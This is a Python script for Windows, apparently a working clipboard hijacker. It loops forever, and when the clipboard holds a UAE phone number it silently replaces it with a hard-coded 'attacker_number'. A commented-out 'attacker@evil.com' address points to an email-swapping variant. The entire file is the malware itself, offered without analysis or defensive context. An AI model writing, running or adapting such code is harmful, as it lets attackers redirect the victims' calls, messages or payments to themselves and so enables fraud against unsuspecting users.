import win32clipboard  # ty:ignore[unresolved-import]
import re
from time import sleep

# attacker_email = "attacker@evil.com"
attacker_number = "0652314587"
# email_regex = "^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$"
uae_phone_regex = "^(?:\+?971\s*|0)\d{2}\s*\d{3}\s*\d{4}$"
# 971 50 548 9874


while True:
    win32clipboard.OpenClipboard()
    try:
        data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT).rstrip()
    except TypeError as _t_e:
        print("Failed.")
        sleep(2)
        continue

    print("Checking...")
    if re.search(uae_phone_regex, data):
        if data != attacker_number:
            print(f"Found {data}, replacing...")
            win32clipboard.EmptyClipboard()
            win32clipboard.SetClipboardText(attacker_number)
            print("Success!")
        else:
            print(f"{data}: Already replaced.")
    else:
        print("Nothing.")

    win32clipboard.CloseClipboard()
    sleep(2)
